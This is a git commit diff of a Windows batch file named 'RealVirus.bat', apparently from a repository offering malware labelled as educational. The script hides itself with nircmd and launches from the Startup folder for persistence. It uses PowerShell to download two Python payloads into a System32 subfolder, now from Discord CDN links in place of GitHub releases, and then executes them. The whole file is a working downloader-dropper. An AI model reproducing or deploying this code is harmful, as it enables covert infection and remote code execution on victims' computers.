329418ec91cd096b9dda6741e133d02e792535b5
DarioStar999 <105985378+DarioStar999@users.noreply.github.com>
2023-08-30 14:29:11 +0200

    Update RealVirus.bat

--- RealVirus.bat
+++ RealVirus.bat
@@ -1,9 +1,9 @@
 @echo off
 start "" /min "C:\Windows\System32\fuckoffwindows\nircmd.exe" exec hide "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RealVirus.bat"
 
-powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/DarioStar999/Virus-educational-purpose-only/releases/download/REALEASES/BRUH.py','C:\Windows\System32\fuckoffwindows\BRUH.py')
-powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/DarioStar999/Virus-educational-purpose-only/releases/download/REALEASES/XDDD.py','C:\Windows\System32\fuckoffwindows\XDDD.py')
+powershell (new-object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1133293430525677649/1146421022485123082/BRUH.py','C:\Windows\System32\fuckoffwindows\BRUH.py')
+powershell (new-object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1133293430525677649/1146421022912950364/XDDD.py','C:\Windows\System32\fuckoffwindows\XDDD.py')
 
 start C:\Windows\System32\fuckoffwindows\BRUH.py
 start C:\Windows\System32\fuckoffwindows\XDDD.py
-pause >nul
+pause >nu
